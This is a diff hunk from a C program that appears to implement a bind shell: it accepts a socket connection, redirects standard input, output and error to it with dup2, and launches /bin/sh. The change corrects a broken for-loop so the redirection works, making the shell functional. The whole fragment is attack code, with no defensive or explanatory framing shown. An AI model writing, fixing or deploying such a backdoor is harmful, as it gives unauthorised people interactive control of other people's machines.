@@ -17,7 +17,7 @@ int main()
 	int my_accept = accept(my_socket, NULL, NULL);
 
 	int i;
-	for(i = 0; i++; i <3)
+	for(i = 0; i < 3; i++)
 		dup2(my_accept, i);
 
 	execve("/bin/sh", NULL, NULL);
